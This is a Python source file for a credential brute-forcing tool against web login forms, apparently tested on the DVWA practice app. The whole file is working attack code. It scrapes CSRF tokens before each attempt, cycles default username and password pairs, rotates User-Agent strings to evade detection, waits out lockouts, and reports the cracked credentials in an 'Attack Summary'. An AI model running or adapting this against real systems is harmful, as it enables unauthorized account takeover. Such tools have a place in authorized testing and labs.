import requests
import time
import random
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn
from rich.table import Table

# Import constants from your config
try:
    from core.config import TARGET_TIMEOUT, SESSION_DELAY, MAX_BRUTE_ATTEMPTS
    from core.logger import logger
except ImportError:
    # Fallbacks for standalone testing
    TARGET_TIMEOUT, SESSION_DELAY, MAX_BRUTE_ATTEMPTS = 10, 0.5, 500
    import logging
    logger = logging.getLogger(__name__)

console = Console()
ua = UserAgent()

# --- TIERED CREDENTIAL DATABASE (Truncated for brevity, keep your 500-pair list) ---
CREDENTIAL_DATABASE = [
    ("admin", "password"), ("admin", "admin"), ("admin", "password123"),
    # ... include the rest of your tiers here ...
]

# --- DETECTION SIGNALS ---
LOCKOUT_KEYWORDS = {"account locked", "too many attempts", "temporarily blocked", "rate limit"}
FAILURE_KEYWORDS = {"invalid", "incorrect", "failed", "error", "unsuccessful"}

class BruteForceEngine:
    def __init__(self, target_dict):
        self.target = target_dict
        self.session = requests.Session()
        self.session.headers["User-Agent"] = ua.random
        self.baseline = {}

    def _get_fresh_inputs(self):
        """
        Scrapes the login page for ALL input fields (CSRF tokens and buttons).
        Essential for DVWA (user_token) and PHP (Login=Login).
        """
        try:
            resp = self.session.get(self.target["source_page"], timeout=TARGET_TIMEOUT, verify=False)
            soup = BeautifulSoup(resp.text, "lxml")
            inputs = {}
            for inp in soup.find_all("input"):
                name = inp.get("name")
                value = inp.get("value", "")
                if name:
                    inputs[name] = value
            return inputs
        except Exception as e:
            logger.error(f"Failed to fetch fresh tokens: {e}")
            return {}

    def _establish_baseline(self):
        """Sets the 'failure' signature by trying a known-bad login."""
        inputs = self._get_fresh_inputs()
        data = {
            self.target["username_field"]: "invalid_user_xauth",
            self.target["password_field"]: "invalid_pass_xauth",
            **inputs
        }
        try:
            resp = self.session.post(self.target["action"], data=data, timeout=TARGET_TIMEOUT, verify=False)
            self.baseline = {
                "url": resp.url,
                "length": len(resp.text),
                "status": resp.status_code
            }
            console.print(f"[dim]  Baseline established: {resp.status_code} | {len(resp.text)} bytes[/dim]")
        except Exception as e:
            logger.critical(f"Could not establish baseline: {e}")

    def _is_success(self, resp):
        """
        Multivariate success detection based on your logs:
        1. URL Change (e.g., login.php -> index.php)
        2. Status Code 302 in history
        3. Significant body length change
        """
        # Signal 1: URL Shift (The 'DVWA' special)
        if resp.url != self.baseline["url"]:
            if "login.php" not in resp.url.lower():
                return True

        # Signal 2: Redirect History
        for r in resp.history:
            if r.status_code in (301, 302, 303):
                dest = r.headers.get("Location", "").lower()
                if "index" in dest or "dashboard" in dest:
                    return True

        # Signal 3: Disappearance of Failure Keywords
        body_lower = resp.text.lower()
        if not any(kw in body_lower for kw in FAILURE_KEYWORDS):
            # Only if baseline actually HAD failure keywords
            return True

        return False

    def run(self, extra_creds=None):
        creds = (extra_creds or []) + CREDENTIAL_DATABASE
        # Unique pairs preserving order
        clean_creds = []
        [clean_creds.append(x) for x in creds if x not in clean_creds]
        clean_creds = clean_creds[:MAX_BRUTE_ATTEMPTS]

        self._establish_baseline()
        
        found = None
        attempts = 0

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.completed}/{task.total}"),
            TimeElapsedColumn(),
            console=console,
        ) as progress:
            task = progress.add_task("[cyan]Brute-forcing...", total=len(clean_creds))

            for user, pwd in clean_creds:
                attempts += 1
                if attempts % 15 == 0:
                    self.session.headers["User-Agent"] = ua.random
                
                # 1. Fresh Token for every attempt
                form_data = self._get_fresh_inputs()
                form_data.update({
                    self.target["username_field"]: user,
                    self.target["password_field"]: pwd
                })

                # 2. Perform Attempt
                try:
                    resp = self.session.post(
                        self.target["action"], 
                        data=form_data, 
                        timeout=TARGET_TIMEOUT, 
                        verify=False, 
                        allow_redirects=True
                    )
                    
                    # Check Lockout
                    if any(kw in resp.text.lower() for kw in LOCKOUT_KEYWORDS):
                        console.print("\n[bold yellow]LOCKOUT DETECTED. Cooling down...[/bold yellow]")
                        time.sleep(30)
                        continue

                    # 3. Detect Success
                    if self._is_success(resp):
                        found = {"username": user, "password": pwd, "attempt": attempts, "url": resp.url}
                        break

                except Exception as e:
                    logger.warning(f"Request failed: {e}")

                progress.advance(task)
                progress.update(task, description=f"[cyan]Trying [white]{user}[/white]")
                time.sleep(SESSION_DELAY + random.uniform(0, 0.2))

        self._print_summary(found, attempts)
        return found

    def _print_summary(self, found, attempts):
        table = Table(title="Attack Summary", border_style="bright_blue")
        table.add_column("Metric")
        table.add_column("Result")
        table.add_row("Total Attempts", str(attempts))
        if found:
            table.add_row("Status", "[bold red]SUCCESS[/bold red]")
            table.add_row("Credentials", f"{found['username']}:{found['password']}")
            table.add_row("Final URL", found['url'])
        else:
            table.add_row("Status", "[yellow]FAILED[/yellow]")
        console.print(table)

def brute_force(target, extra_credentials=None):
    engine = BruteForceEngine(target)
    result = engine.run(extra_creds=extra_credentials)
    return {
        "target": target["action"],
        "found": result is not None,
        "credentials": result,
        "attempts": target.get("attempts", 0) # Tracked in run()
    }